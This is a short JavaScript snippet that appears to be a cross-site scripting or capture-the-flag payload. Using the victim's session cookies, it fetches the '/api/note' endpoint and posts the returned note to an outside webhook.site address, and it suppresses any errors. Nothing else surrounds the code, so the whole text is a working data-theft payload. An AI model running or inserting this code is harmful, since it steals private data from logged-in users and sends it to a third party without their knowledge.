(async () => {
  try {
    const r = await fetch('/api/note', { credentials: 'include' });
    const { note } = await r.json();
    await fetch('https://webhook.site/1211f911-0726-4472-824b-e349f9bbf755', { method: 'POST', mode: 'no-cors', body: note });
  } catch {}
})();
